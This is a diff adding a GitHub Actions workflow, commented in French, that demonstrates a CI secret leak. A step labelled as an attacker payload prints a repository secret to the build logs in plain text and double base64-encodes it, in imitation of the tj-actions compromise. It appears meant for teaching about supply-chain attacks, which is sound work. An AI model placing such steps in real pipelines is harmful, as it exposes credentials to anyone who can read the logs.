@@ -1,0 +1,39 @@
+name: Demo leak secret compromis
+
+on: [push]
+
+jobs:
+  demo:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # Étape normale
+      - name: Affichage légitime
+        run: |
+          echo "----- Début du log légitime -----"
+          echo "La valeur du secret est : $DEMO_SECRET"
+          echo "----- Fin du log légitime -----"
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
+
+      # Étape malveillante
+      - name: 🚨 Étape compromise : extraction du secret en clair
+        shell: bash
+        run: |
+          echo ""
+          echo "===== ⚠️ ATTACKER PAYLOAD ACTIVÉ ====="
+          echo "[Attacker] Lecture de la variable d'environnement..."
+          echo "[Attacker] Secret exfiltré en clair : $DEMO_SECRET"
+          echo ""
+          echo "[Attacker] Double encodage Base64 (comme l'attaque tj-actions) :"
+          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
+          echo "$encoded"
+          echo ""
+          echo "[Attacker] Décodage du double Base64 :"
+          echo "$encoded" | base64 --decode | base64 --decode
+          echo "===== ⚠️ FIN DU PAYLOAD ====="
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
